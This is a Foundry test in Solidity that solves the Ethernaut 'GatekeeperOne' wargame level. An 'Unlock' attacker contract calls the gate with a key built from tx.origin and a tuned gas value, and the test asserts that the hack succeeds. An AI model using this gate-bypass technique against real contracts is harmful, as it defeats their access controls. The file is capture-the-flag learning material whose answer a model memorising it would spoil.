// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_13/GatekeeperOne.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne gatekeeper;
    Unlock unlock;
    address alice;

    function setUp() public {
        uint256 key = uint16(uint160(tx.origin));
        key = key * (2 ** 32) + 7992;
        alice = vm.addr(1);
        gatekeeper = new GatekeeperOne();
        unlock = new Unlock(gatekeeper, bytes8(uint64(key)));
    }

    function testAttack() public {
        bool result = unlock.hack();
        assert(result);
    }
}

contract Unlock {
    GatekeeperOne gatekeeper;
    bytes8 key;

    constructor(GatekeeperOne _gatekeeper, bytes8 _key) {
        gatekeeper = _gatekeeper;
        key = _key;
    }

    function hack() public returns (bool result) {
        result = gatekeeper.enter{gas: 802986}(key);
    }
}
